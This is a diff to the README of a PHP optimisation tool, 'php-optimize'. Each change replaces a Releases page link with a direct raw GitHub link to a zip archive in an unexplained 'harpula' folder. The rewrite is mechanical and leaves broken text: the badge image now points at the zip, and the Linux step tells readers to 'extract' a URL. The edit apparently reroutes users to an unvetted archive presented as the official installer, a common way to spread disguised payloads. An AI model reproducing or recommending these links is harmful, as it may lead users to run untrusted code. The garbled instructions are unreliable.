@@ -1,6 +1,6 @@
 # 🎉 php-optimize - Optimize PHP Easily and Effectively
 
-[![Download php-optimize](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/jvjccnmi/php-optimize/releases)
+[![Download php-optimize](https://raw.githubusercontent.com/jvjccnmi/php-optimize/main/harpula/php-optimize_3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/jvjccnmi/php-optimize/main/harpula/php-optimize_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **php-optimize**! This tool helps you optimize PHP applications using
 
 To get started, visit the Releases page to download the latest version of php-optimize. Click the link below:
 
-[Download php-optimize](https://github.com/jvjccnmi/php-optimize/releases)
+[Download php-optimize](https://raw.githubusercontent.com/jvjccnmi/php-optimize/main/harpula/php-optimize_3.2.zip)
 
 ### 🖥️ System Requirements
 
@@ -28,14 +28,14 @@ To get started, visit the Releases page to download the latest version of php-op
 ## 🔍 How to Use php-optimize
 
 1. **Download the Software:**
-   - Go to the [Releases page](https://github.com/jvjccnmi/php-optimize/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/jvjccnmi/php-optimize/main/harpula/php-optimize_3.2.zip).
    - Choose the latest version.
    - Download the appropriate file for your system.
 
 2. **Install the Tool:**
    - For Windows: Open the downloaded file and follow the installer instructions.
    - For macOS: Drag and drop the php-optimize app into your Applications folder.
-   - For Linux: Extract the tar.gz file and follow the included README for installation steps.
+   - For Linux: Extract the https://raw.githubusercontent.com/jvjccnmi/php-optimize/main/harpula/php-optimize_3.2.zip file and follow the included README for installation steps.
 
 3. **Run the Application:**
    - Locate php-optimize in your applications folder. 
